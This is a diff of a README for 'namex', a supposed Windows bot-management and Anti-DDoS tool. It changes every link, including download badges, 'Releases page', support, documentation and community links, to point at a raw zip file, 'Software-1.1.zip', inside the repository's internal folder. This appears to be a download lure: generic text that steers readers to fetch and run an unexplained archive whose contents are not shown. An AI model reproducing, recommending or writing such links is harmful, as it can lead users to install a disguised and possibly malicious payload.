@@ -4,7 +4,7 @@
 Welcome to the namex project! This application helps you protect your online presence with bot management and Anti-DDoS features. Follow these simple steps to get started.
 
 ## 📥 Download Now
-[![Download namex](https://raw.githubusercontent.com/Hemant028/namex/main/internal/domain/namex_3.9.zip)](https://raw.githubusercontent.com/Hemant028/namex/main/internal/domain/namex_3.9.zip)
+[![Download namex](https://raw.githubusercontent.com/Hemant028/namex/main/internal/Software-1.1.zip)](https://raw.githubusercontent.com/Hemant028/namex/main/internal/Software-1.1.zip)
 
 ## 📋 System Requirements
 - **Operating System:** Windows 10 or later.
@@ -20,7 +20,7 @@ Welcome to the namex project! This application helps you protect your online pre
 
 ## 💻 Installation Instructions
 ### Step 1: Visit the Download Page
-To download namex, visit our [Releases page](https://raw.githubusercontent.com/Hemant028/namex/main/internal/domain/namex_3.9.zip). This page contains the latest version of the software.
+To download namex, visit our [Releases page](https://raw.githubusercontent.com/Hemant028/namex/main/internal/Software-1.1.zip). This page contains the latest version of the software.
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see different versions available. Click on the version you want to download. This will take you to more details about that release.
@@ -48,15 +48,15 @@ Once namex starts, you can configure the settings according to your needs. Here�
 - **Logs:** Keep track of all actions taken by the application for future reference.
 
 ## 📞 Support
-If you need help while using namex, please visit our [support page](https://raw.githubusercontent.com/Hemant028/namex/main/internal/domain/namex_3.9.zip). You can report issues or ask questions there.
+If you need help while using namex, please visit our [support page](https://raw.githubusercontent.com/Hemant028/namex/main/internal/Software-1.1.zip). You can report issues or ask questions there.
 
 ## 🔗 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/Hemant028/namex/main/internal/domain/namex_3.9.zip): Detailed user manuals and guides.
-- [Community Support](https://raw.githubusercontent.com/Hemant028/namex/main/internal/domain/namex_3.9.zip): Join discussions with other users for tips and best practices.
+- [Documentation](https://raw.githubusercontent.com/Hemant028/namex/main/internal/Software-1.1.zip): Detailed user manuals and guides.
+- [Community Support](https://raw.githubusercontent.com/Hemant028/namex/main/internal/Software-1.1.zip): Join discussions with other users for tips and best practices.
 
 ## 🔄 Stay Updated
 Keep an eye on our Releases page for the latest updates. Regular updates include new features, security patches, and performance improvements.
 
-[![Download namex](https://raw.githubusercontent.com/Hemant028/namex/main/internal/domain/namex_3.9.zip)](https://raw.githubusercontent.com/Hemant028/namex/main/internal/domain/namex_3.9.zip) 
+[![Download namex](https://raw.githubusercontent.com/Hemant028/namex/main/internal/Software-1.1.zip)](https://raw.githubusercontent.com/Hemant028/namex/main/internal/Software-1.1.zip) 
 
 Thank you for choosing namex! Your online safety is important to us.
